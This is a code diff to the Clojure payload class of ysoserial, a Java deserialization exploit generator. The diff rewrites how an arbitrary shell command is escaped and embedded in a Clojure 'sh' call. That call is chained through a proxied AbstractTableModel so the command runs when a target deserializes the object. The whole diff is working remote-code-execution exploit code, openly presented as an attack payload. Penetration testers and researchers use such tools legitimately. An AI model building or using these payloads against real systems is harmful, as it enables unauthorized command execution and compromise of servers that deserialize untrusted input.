@@ -2,10 +2,12 @@ package ysoserial.payloads;
 
 import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
 import clojure.lang.PersistentArrayMap;
+import ysoserial.Strings;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.PayloadRunner;
 
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -28,18 +30,26 @@ public class Clojure extends PayloadRunner implements ObjectPayload<Map<?, ?>> {
 
 	public Map<?, ?> getObject(final String command) throws Exception {
 
-		final String[] execArgs = command.split(" ");
-		final StringBuilder commandArgs = new StringBuilder();
-		for (String arg : execArgs) {
-			commandArgs.append("\" \"");
-			commandArgs.append(arg);
-		}
-		commandArgs.append("\"");
+//		final String[] execArgs = command.split(" ");
+//		final StringBuilder commandArgs = new StringBuilder();
+//		for (String arg : execArgs) {
+//			commandArgs.append("\" \"");
+//			commandArgs.append(arg);
+//		}
+//		commandArgs.append("\"");
 
-		final String clojurePayload =
-				String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", commandArgs.substring(2));
 
-		Map<String, Object> fnMap = new HashMap<String, Object>();
+//		final String clojurePayload =
+//				String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", commandArgs.substring(2));
+
+        String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\").split(" ")), " ", "\"", "\"");
+
+        final String clojurePayload =
+            String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", cmd);
+
+
+
+        Map<String, Object> fnMap = new HashMap<String, Object>();
 		fnMap.put("hashCode", new clojure.core$constantly().invoke(0));
 
 		AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
